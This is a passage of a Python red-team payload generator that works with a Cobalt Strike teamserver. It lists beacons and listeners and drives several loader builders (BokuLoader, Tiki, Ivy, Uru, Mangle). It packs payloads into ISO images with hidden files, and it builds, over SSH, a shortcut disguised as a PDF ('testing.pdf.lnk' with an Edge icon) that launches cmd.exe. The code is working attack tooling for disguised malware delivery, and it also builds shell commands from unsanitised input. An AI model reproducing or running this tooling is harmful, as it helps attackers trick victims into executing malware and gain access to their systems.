        selectedHiddenItems = [fileName[i] for i in options]

    mergedList = '" "'.join(fileName)
    mergedList = '"'+mergedList+'"'

    appendedString = '-hidden '
    appendedString += '% s'
    finalHiddenList =  [appendedString % i for i in selectedHiddenItems]
    mergedFinalHiddenList = ' '.join(finalHiddenList)

    #import pdb; pdb.set_trace()

    if hiddenOption == '0':
        os.system('mkisofs -o '+payloadPath+'/iso-payloads/'+isoName+' -J -r -V "'+isoVolumeName+'" '+mergedList+'')
    else:
        os.system('mkisofs -o '+payloadPath+'/iso-payloads/'+isoName+' -J -r -V "'+isoVolumeName+'" '+mergedFinalHiddenList+' '+mergedList+'')

    #example for regular iso later 
    #os.system('mkisofs -o '+payloadPath+'/iso-payloads/'+isoName+' -J -r -V "'+isoVolumeName+'" -graft-points "/root/tools/cobaltstrike_4.6/go-kit/payloads/BokuLoader-payloads/https-BokuLoader.x64.exe"')
    #example hidden files for later
    #os.system(' mkisofs -o /root/tools/cobaltstrike_4.6/go-kit/payloads/iso-payloads/hiddenTest.iso -J -r -V "HiddenTest" -hidden "/root/tools/cobaltstrike_4.6/go-kit/payloads/BokuLoader-payloads/https-BokuLoader.x64.exe" "/root/tools/cobaltstrike_4.6/go-kit/payloads/ivy-payloads" "/root/tools/cobaltstrike_4.6/go-kit/payloads/BokuLoader-payloads/https-BokuLoader.x64.exe"')

def createLNK():
    txt = input("*** Was SSH enabled on windows server? *** \n [Yes/No]\n ")
    if txt.lower() == 'yes' or txt.lower() == 'y':
        print()
    else:
        print("Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0")
        print("Start-Service sshd")
        print("exiting...")
        return
    txt = input("*** Was the default shell changed to PWSH??? *** \n [Yes/No]\n ")
    if txt.lower() == 'yes' or txt.lower() == 'y':
        print()
    else:
        text = """New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe" -PropertyType String -Force\
    \nNew-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShellCommandOption -Value "/c" -PropertyType String -Force  """
        print(text)
        print("exiting...")
        return
    

    ssh = paramiko.SSHClient()
    ip = input("Set IP of the Windows Server: \n")
    username = input("Set the username: \n")
    password = input("Set the password: \n")
    lnkFileName = input("Set LnkFileName: (i.e. testing.pdf.lnk)\n Default: testing.pdf.lnk \n")
    if not lnkFileName:
        lnkFileName = "testing.pdf.lnk"
    lnkTargetPath = input("Set TargetPath for LNK: (i.e. cmd.exe)\n Default: cmd.exe \n")
    if not lnkTargetPath:
        lnkTargetPath = "cmd.exe"
    # delete after testing
    #ip = '192.168.0.222'
    #username = 'administrator'
    #password = 'password'
    port = '22'
    
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip,port,username,password)

    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("$path = \"$([Environment]::GetFolderPath('Desktop'))\\"+lnkFileName+"\"; \
    $wshell = New-Object -ComObject Wscript.Shell;\
    $shortcut = $wshell.CreateShortcut($path);\
    $shortcut.IconLocation = \"%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe,13\";\
    $shortcut.TargetPath = \""+ lnkTargetPath +"\";\
    $shortcut.WorkingDirectory = \"\";\
    $shortcut.Description = \"PDF\";\
    $shortcut.WindowStyle = 7;\
    $shortcut.Save()")

    outlines=ssh_stdout.readlines()
    scp = SCPClient(ssh.get_transport())
    remote_path = "C:\\Users\\Administrator\\Desktop\\"+lnkFileName
    local_path = lnkPayloadPath+lnkFileName
    scp.get(remote_path,local_path)
    ssh.close()
    resp=''.join(outlines)
    print(resp)

def createSharpshooter():
    return 0

## Let's gooooooooooooooooooooo
def main(args):

    cs_host = args.host
    cs_port = args.port
    cs_user = args.username
    cs_pass = args.password
    cs_directory = args.path
    #loader = args.loader

    ## Connect to server
    print(f"[*] Connecting to teamserver: {cs_host}")
    with CSConnector(
        cs_host=cs_host,
        cs_port=cs_port,
        cs_user=cs_user,
        cs_pass=cs_pass,
        cs_directory=cs_directory) as cs:

        # Perform some actions
        # Get beacon metadata - i.e., x beacons() from the script console

        print("[+] Getting beacons")
        beacons = cs.get_beacons()
        #print list of beacons and all attributes
        pprint(beacons)

        # Get list of listners - i.e., x listeners_stageless() from the script console
        listeners = cs.get_listeners_stageless()
        print("[+] Getting listeners")
        #print list of beacons and all attributes
        pprint(listeners)
        payloadCreation = True
        while payloadCreation == True:
            user_input = input("What payloads would you like to generate? \n\
        [0] - CS Payloads \n\
        [1] - BokuLoader Payload \n\
        [2] - Tiki Payloads \n\
        [3] - Ivy Payloads \n\
        [4] - Uru Payloads \n\
        [5] - Mangle Payloads \n\
        [6] - LNK File \n\
        [7] - ISO Packer \n\
        [8] - Exit \n\
        ")
            match user_input:
                case '0':
                    print('Creating CobaltStrike Payloads')
                    cs_payloads(cs, listeners)
                case '1':
                    print('Creating BokuLoader Payloads')
                    boku_payloads(cs, listeners)
                case '2':
                    print('Creating Tiki Payloads')
                    tikiPayload()
                case '3':
                    print('Creating Ivy Payloads')
                    ivyPayload()
                case '4':
                    print('Creating Uru Payloads')
                    uruPayload()
                case '5':
                    print('Creating Mangle Payloads')
                    manglePayload()
                case '6':
                    print('Creating LNK File')
                    createLNK()
                case '7':
                    print('Creating ISO Packer')
                    isoPacker()
                case '8':
                    payloadCreation = False
                    print("Happy Hunting!")
                case _:
                    print("Invalid input, goodbye!")

        #to do
        #createSharpshooter()
        #lnkIsoPayload()
        
        #done
        #ivyPayload()
        #tikiPayload()
        #uruPayload()
        #manglePayload()
        #isoPacker()

if __name__ == "__main__":
    args = parseArguments()
    main(args)
